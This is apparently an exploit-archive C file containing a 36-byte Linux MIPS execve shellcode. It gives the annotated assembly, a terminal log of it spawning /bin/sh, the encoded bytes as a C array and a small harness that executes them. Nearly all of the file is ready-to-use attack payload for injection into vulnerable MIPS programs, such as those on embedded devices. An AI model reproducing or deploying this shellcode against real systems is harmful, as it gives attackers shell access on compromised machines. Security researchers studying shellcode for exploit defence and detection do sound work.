/*
# Exploit Title: 36byte Linux MIPS execve
# Date: 2015 - 1 - 20
# Exploit Author: Sanguine
# Vendor Homepage: http://sangu1ne.tistory.com/
*/


#include <stdio.h>
/*
Sanguine@debian-mipsel:~/leaveret# cat > MIPS_36b_sc.s
.section .text
.globl __start
.set noreorder
__start:
slti $a2, $zero, -1   #set a1 to zero
p:
bltzal $a2, p            #not branch always and save ra
slti $a1, $zero, -1   #set a1 to zero
addu $a0, $ra, 4097       #a0 + 16
addu $a0, $a0, -4081
li $v0, 4011
syscall  0x40404
.string "/bin/sh"
Sanguine@debian-mipsel:~/leaveret# as MIPS_36b_sc.s -o MIPS_36b_sc.o
Sanguine@debian-mipsel:~/leaveret# ld MIPS_36b_sc.o -o MIPS_36b_sc
Sanguine@debian-mipsel:~/leaveret# ./MIPS_36b_sc
$ exit

*/
char sc[] = {
    "\xff\xff\x06\x28" /* slti $a2, $zero, -1 */
    "\xff\xff\xd0\x04" /* bltzal $a2, <p> */
    "\xff\xff\x05\x28" /* slti $a1, $zero, -1  */
    "\x01\x10\xe4\x27" /* addu $a0, $ra, 4097 */
    "\x0f\xf0\x84\x24" /* addu $a0, $a0, -4081 */
    "\xab\x0f\x02\x24" /* li $v0, 4011  */
    "\x0c\x01\x01\x01" /* syscall  0x40404 */
    "/bin/sh"
};

void
main(void)
{
    void (*s)(void);
    printf("sc size %d\n", sizeof(sc));
    s = sc;
    s();
}